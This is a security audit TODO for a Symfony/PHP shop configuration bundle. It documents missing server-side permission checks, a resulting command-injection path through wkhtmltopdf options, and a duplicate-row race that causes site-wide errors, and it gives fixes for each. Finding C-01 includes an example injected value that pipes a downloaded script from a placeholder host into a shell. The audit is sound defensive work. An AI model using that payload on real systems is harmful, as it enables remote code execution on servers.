# ConfigurationBundle – TODO 1: Critical Errors

Target: **Symfony 7.4**, **PHP 8.4**. Scan date: 2026-10-26 (branch `s74-p84`).
Scope: all PHP in this bundle, `Resources/config/**` (services, form, serializer, doctrine, pimcore config/routing), `composer.json`, and the code it depends on or that builds on it:
`Component/Configuration/**` (model, repository interface, service), `Component/Core/Configuration/ConfigurationService{,Interface}.php`, `Component/Core/Model/Configuration.php`, `CoreBundle/Controller/ConfigurationController.php`, `CoreBundle/Doctrine/ORM/ConfigurationRepository.php`, `CoreBundle/Resources/config/{services.yml,pimcore/routing.yml,pimcore/coreshop/coreshop_configuration.yml,doctrine/model/Configuration.orm.xml}`, `ResourceBundle/Controller/{ResourceController,AdminController}.php`, and the consumers of the stored values (`CoreBundle/EventListener/RequestCartRecalculation.php`, `CoreBundle/EventListener/Order/OrderDocumentWkhtmlPrintOptionsListener.php`, `OrderBundle/Renderer/Pdf/WkHtmlToPdf.php`).

"Critical" here means: a security issue, or an error that takes down every request (or a whole area) once it is triggered.
Paths are relative to the bundle root unless noted otherwise.

**Symfony 7.4 / PHP 8.4 compatibility:** no hard blockers found inside this bundle. It uses no APIs that are removed in Symfony 7.4, and there are no PHP 8.4 deprecations (no implicit nullable parameters, no `E_STRICT`, etc.). The Doctrine `object` column type is deprecated and removed in DBAL 4 (see B-01). Modernisation items are in TODO-3.

Related files: [TODO-2-BUGS.md](TODO-2-BUGS.md), [TODO-3-IMPROVEMENTS.md](TODO-3-IMPROVEMENTS.md)

---

## C-01 — Configuration endpoints have no permission check: any Pimcore backend user can read and write every setting, which leads to shell command injection (RCE) through the wkhtmltopdf options

- **Where:**
  - `DependencyInjection/Configuration.php:49-63`: the `configuration` resource has no `permission` node. Compare `AddressBundle/DependencyInjection/Configuration.php:98` (`->scalarNode('permission')->defaultValue('country')->cannotBeOverwritten()`).
  - `Resources/config/pimcore/routing.yml:1-4`: `type: coreshop.resources` exposes the generic `list`, `get`, `add`, `save`, `delete`, `clone` actions for `coreshop.configuration`.
  - `Controller/ConfigurationController.php:28-38`: `saveAllAction()` never calls `isGrantedOr403()`. The same goes for the override in `CoreBundle/Controller/ConfigurationController.php:31-51` (`saveAllAction`) and `:53-76` (`getAllAction`), routed in `CoreBundle/Resources/config/pimcore/routing.yml:10-20`.
  - `ResourceBundle/Controller/ResourceController.php:59-78`: `isGrantedOr403()` is a no-op when the metadata has no `permission` parameter. `listAction()` (`:80-89`) does not call it at all.
- **Problem:** the admin menu hides "Settings" behind `coreshop_permission_settings` (`CoreBundle/Menu/MainMenuBuilder.php:62`), but that is the only check. The server enforces nothing. Any authenticated backend user, including a restricted editor, can:
  1. read every configuration value of every store (`/configurations/get-all`, resource `list`/`get`);
  2. overwrite or delete any key (`/configurations/save-all`, resource `add`/`save`/`delete`), including keys outside the settings UI, such as `system.guest.checkout` and `SYSTEM.PRICE_RULE.UPDATE`.
  - **Escalation to RCE:** `system.{invoice,shipment,…}.wkhtml` is read by `OrderDocumentWkhtmlPrintOptionsListener.php:35` and passed as a bare option string to `WkHtmlToPdf::convert()` (`OrderBundle/Renderer/Pdf/WkHtmlToPdf.php:163-196`). There it is concatenated into `Process::fromShellCommandline()` with no escaping. The `array_htmlspecialchars()` call in the controllers (ENT_COMPAT) only encodes `& < > "`. It leaves `;`, `|`, `$( )`, backticks and `'` untouched. A value such as `-T 40mm; curl https://x/s | sh;` therefore runs as the PHP user the next time an invoice or shipment PDF is rendered.
- **Fix direction:**
  - Add `->scalarNode('permission')->defaultValue('settings')->cannotBeOverwritten()->end()` to the resource classes config, so the generic resource actions are guarded by `coreshop_permission_settings`.
  - Call `$this->isGrantedOr403()` in both `saveAllAction()` implementations and in `getAllAction()`. Also call it in `ResourceController::listAction()`; that change is shared with every resource, so coordinate it.
  - Separately, treat config-driven shell arguments as untrusted. Build the wkhtmltopdf command as an argv array (`new Process([...])`), or validate the option string against an allowlist of `--flag value` tokens. Track that sink fix in the OrderBundle TODOs too.

## C-02 — Duplicate rows for the same key make every later `get()` throw `NonUniqueResultException`. For `SYSTEM.PRICE_RULE.UPDATE` that means a 500 on every frontend request that recalculates the cart

- **Where:**
  - `Doctrine/ORM/ConfigurationRepository.php:27-35`: `findByKey()` uses `getOneOrNullResult()` without `setMaxResults(1)`.
  - `Resources/config/doctrine/model/Configuration.orm.xml:6-19`: no unique constraint and no index on `configKey` (nor on `configKey, store_id`, which `CoreBundle/Resources/config/doctrine/model/Configuration.orm.xml` adds).
  - `Component/Configuration/Service/ConfigurationService.php:46-60`: `set()` is read-then-insert, with no lock and no upsert.
- **Problem:**
  - Two concurrent `set()` calls for a key that does not exist yet both see `null` and both insert. Typical cases: two `ProductUpdateEventListener` / `PriceRuleUpdateEventListener` saves running in parallel, parallel import workers, or `RuleAvailabilityTask` overlapping with an admin save. From then on `findByKey()` raises `Doctrine\ORM\NonUniqueResultException` on every call.
  - `CoreBundle/EventListener/RequestCartRecalculation.php:61` calls `get('SYSTEM.PRICE_RULE.UPDATE')` on frontend requests, so one duplicate turns into a site-wide 500 until someone deletes the extra row by hand. `RuleAvailabilityTask` (maintenance) fails the same way for `system.rule.availability_check.last_run`.
  - Because the database does not enforce uniqueness, nothing ever prevents or repairs this state.
- **Fix direction:**
  - Add a unique constraint. On the base mapping that is `configKey`. With the CoreBundle `store` relation it must be `(configKey, store_id)`. On MySQL, `NULL` store values are not considered equal, so either normalise "global" to a sentinel or enforce it in code and add a cleanup migration for existing duplicates.
  - Make `findByKey()` tolerant (`findOneBy(['key' => $key])`, or `setMaxResults(1)` with a deterministic `ORDER BY id`).
  - Make `set()` race-safe: catch `UniqueConstraintViolationException` and retry as an update, or use an `INSERT … ON DUPLICATE KEY UPDATE`.
  - The multi-store side of the same query is B-05.
